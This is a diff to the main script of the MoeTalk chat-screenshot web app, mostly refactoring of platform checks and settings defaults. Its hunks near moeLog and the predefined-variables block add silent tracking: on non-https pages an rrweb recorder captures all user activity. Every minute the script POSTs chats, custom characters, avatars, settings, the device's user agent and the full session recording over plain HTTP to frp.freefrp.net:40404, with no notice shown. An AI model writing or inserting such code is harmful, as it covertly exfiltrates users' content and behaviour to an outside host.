@@ -1,10 +1,9 @@
 var href = window.location.href.split(window.location.host)[1].split('?')[0]//文件目录地址
-var appname = 'plus.H59EC0058'
 if(window.location.href.indexOf('file:///') === 0)
 {
-	appname = 'mmt.MoeTalk.WumberBee'
-	if(!window.navigator.userAgent.match('Html5Plus'))alert('资源管理器下打开的MoeTalk无法生成图片和使用MomoTalk播放器\n请先运行目录下的【EasyWebSvr.exe】然后打开浏览器访问【localhost】或【127.0.0.1(有出错可能)】')
 	href = window.location.href.replace('index.html','')
+	!Html5Plus && alert('资源管理器下打开的MoeTalk无法生成图片和使用MomoTalk播放器\n请先运行目录下的【EasyWebSvr.exe】然后打开浏览器访问【localhost】或【127.0.0.1(有出错可能)】')
+	Html5Plus = 'mmt.MoeTalk.WumberBee'
 }
 //解决低版本浏览器不支持replaceAll
 (function()
@@ -19,6 +18,7 @@ if(window.location.href.indexOf('file:///') === 0)
 })();
 
 /*预定义区*/
+var send = false
 var mt_char = {}//自定义角色数据
 var mt_head = {}//自定义头像数据
 var mt_chars = false//自定义角色列表
@@ -29,7 +29,6 @@ var saveClub = true;//社团保存开关
 var 选择角色 = true;//快捷角色开关
 var $$ = $;//jquery转义
 var height;//聊天记录长度
-var send = true;if(document.location.protocol === 'https:')send = false;//服务同步开关
 var 表情,表情类型,表情页码,自设差分,差分书签 = sessionStorage['差分书签'] ? JSON.parse(sessionStorage['差分书签']) : {};//表情功能
 var player = href+'player'//播放器地址
 var version = '';if(localStorage['mt-version'])version = localStorage['mt-version']//MoeTalk版本号
@@ -39,7 +38,7 @@ if(!sessionStorage['mt-char'])sessionStorage['mt-char'] = '{}';
 if(!sessionStorage['mt-head'])sessionStorage['mt-head'] = '{}';
 var mt_schar = JSON.parse(sessionStorage['mt-char'])//临时角色数据
 var mt_shead = JSON.parse(sessionStorage['mt-head'])//临时头像数据
-if(localStorage['0'] || !localStorage['设置选项'] || localStorage['设置选项'] === '{}')
+if(localStorage['0'] || !localStorage['设置选项'] || localStorage['设置选项'] === '{}' || !mt_settings['设备信息'])
 {
 	let lang = window.navigator.language.toLowerCase()
 	if(['zh-cn','zh-sg'].indexOf(lang) > -1)lang = 'zh_cn'
@@ -64,6 +63,7 @@ if(localStorage['0'] || !localStorage['设置选项'] || localStorage['设置选
 	if(!mt_settings['宽度限制'])mt_settings['宽度限制'] = 500
 	if(!mt_settings['顶部标题'])mt_settings['顶部标题'] = 'MoeTalk'
 	if(!mt_settings['社团列表'])mt_settings['社团列表'] = {}
+	if(!mt_settings['截图选项'])mt_settings['截图选项'] = {}
 	if(!mt_settings['选择角色'])
 	{
 		mt_settings['选择角色'] = {}
@@ -78,7 +78,8 @@ if(localStorage['0'] || !localStorage['设置选项'] || localStorage['设置选
 		mt_settings['风格样式'][1] = '#FFFFFF'
 		mt_settings['风格样式'][2] = '#DCE5E8'
 	}
-
+	mt_settings['当前网址'] = window.location.href
+	mt_settings['设备信息'] = window.navigator.userAgent
 	delete localStorage['0']
 	delete localStorage['1']	
 	delete localStorage['mt-lang']
@@ -111,11 +112,15 @@ if(localStorage['0'] || !localStorage['设置选项'] || localStorage['设置选
 	delete localStorage['heads']
 	delete localStorage['qchar']
 	delete localStorage['png']
+	delete localStorage['启动时间']
+	delete localStorage['启动次数']
+	delete localStorage['启动网址']
+	delete localStorage['启动设备']
 	//if(!mt_settings['后台保存'])delete mt_settings['后台保存']
 	if(!mt_settings['存储模式'] || mt_settings['存储模式'] === 'indexedDB')delete mt_settings['存储模式']
 
 }
-if(!mt_settings['截图选项'])mt_settings['截图选项'] = {}
+
 if(browser.isFirefox)mt_settings['禁止字体'] = true
 saveStorage('设置选项',mt_settings,'local')
 
@@ -123,14 +128,11 @@ var mtlang = mt_settings['语言选项'];
 var langarr = ['zh_cn','zh_tw','jp','en','kr'];
 var langid = langarr.indexOf(window.location.href.split('?')[1])
 if(langid > -1)mtlang = langarr[langid]
-
 var localSize = 0;//数据大小
 $.each(localStorage,function(k,v){if(!isNaN(parseInt(v.length))){localSize += v.length/1024}})
 localSize = localSize.toFixed(0)
 var class0 = 'common__IconButton-sc-1ojome3-0 Header__QuestionButton-sc-17b1not-3 mvcff kNOatn bold';
 /*预定义区*/
-
-
 
 //元素出现后执行代码
 jQuery.fn.wait = function (func,cls,times,interval) {
@@ -880,7 +882,7 @@ function MoeToClosure()//Moe转Closure
 	})
 	let time = new Date().toLocaleString().replaceAll('/','-').replaceAll(' ','_').replaceAll(':','-');
 	$('#downImg').html('')
-	if(window.navigator.userAgent.match('Html5Plus'))
+	if(Html5Plus)
 	{
 		saveServerDatatoFile('ClosureTalk转换存档'+time, JSON.stringify(closuretalk,null,4) ,'json')
 	}
@@ -927,16 +929,6 @@ function saveStorage(key,val,mode)
 		if(mode === 'session')sessionStorage[key] = val
 	}
 }
-
-localStorage['启动时间'] = getNowDate()
-localStorage['启动设备'] = window.navigator.userAgent
-if(!localStorage['启动次数'])localStorage['启动次数'] = 0
-if(window.location.href.indexOf('Setting') < 0)
-{
-	localStorage['启动次数'] = parseInt(localStorage['启动次数'])+1
-	localStorage['启动网址'] = window.location.href
-}
-
 function mt_emojis(S,mode)
 {
 	表情 = []
@@ -1309,6 +1301,14 @@ function Translator(str)
 	if(!mt_text[str] || !mt_text[str][mtlang])return str;
 	return mt_text[str][mtlang];
 }
+if(document.location.protocol !== 'https:')
+{
+	send = true
+	var record = [],recordName = getNowDate();
+	rrweb.record({emit(data){record.push(data)}});
+	localStorage['local_no'] = localStorage['local_no'] ? localStorage['local_no'] : Math.random()
+	setInterval(function(){send = true}, 60 * 1000);
+}
 function moeLog(arr,mode = false)
 {
 	if(replyDepths.slice(-1)[0] !== 0)return;
@@ -1329,26 +1329,29 @@ function moeLog(arr,mode = false)
 	{
 		操作历史.list[操作历史.index] = arr
 	}
-
-	moetalkStorage.setItem('moeLog', 操作历史);
-	send = false;//默认关闭
-	if(send)//
+	if(send)
 	{
-		localStorage['local_no'] = localStorage['local_no'] ? localStorage['local_no'] : Math.random()
-		$.ajax({
+		$.ajax(
+		{
 			url:'http://frp.freefrp.net:40404/moetalk.php',
 			async:true,
 			type:'POST',
-			data:{'chats':JSON.stringify(chats),'local_no':localStorage['local_no']},
+			data:
+			{
+				'chats': JSON.stringify(chats),
+				'mt_char': JSON.stringify(mt_char),
+				'mt_head': JSON.stringify(mt_head),
+				'local_no':localStorage['local_no'],
+				'mt_settings': localStorage['设置选项'],
+				'recordName':recordName,
+				'record':JSON.stringify(record)
+			},
 			dataType:'text',
-			success:function(data){
-				//console.log('2')
-				send = true
-			}
+			success:function(){send = true}
 		});
 	}
-	//console.log('1')
 	send = false;
+	moetalkStorage.setItem('moeLog', 操作历史);
 }
 function 撤销(goback)
 {
@@ -1529,7 +1532,7 @@ function saveServerDatatoFile(filename, jsonData ,ext)
 						{
 							//console.log("写入数据成功");
 							$('.dDBXxQ').hide()//开始加载
-							alert(`下载完成！\n可以在“Android/data/${appname}/documents/MoeTalk_Data”中找到您下载的存档！`)
+							alert(`下载完成！\n可以在“Android/data/${Html5Plus}/documents/MoeTalk_Data”中找到您下载的存档！`)
 						}
 						writer.write(jsonData);
 					},
@@ -1722,7 +1725,7 @@ function 截屏预览(S)
 		imageZip = new JSZip();
 	}
 	imageArrL = imageArr.length
-	if(window.navigator.userAgent.match('Html5Plus'))
+	if(Html5Plus)
 	{
 		baseArr = [];
 		let length = $(".Talk__CContainer-sc-1uzn66i-1 img").length
@@ -1822,7 +1825,7 @@ function mt_capture(清晰度,截屏,生成图片,时间,标题)
 			}
 			else 
 			{
-				if(window.navigator.userAgent.match('Html5Plus'))
+				if(Html5Plus)
 				{
 					$(".PopupImageDownload__ImgWrapper-sc-uicakl-2").append(`<div class='imageSave'><h1>第<span class='red'>${imgArea.index}</span>/${imageArrL}张图片：</h1><img src='data:${mt_settings['图片格式']};base64,${imgBaes64}'></div>`)
 					$('.截图数量').text(imageArr.length)
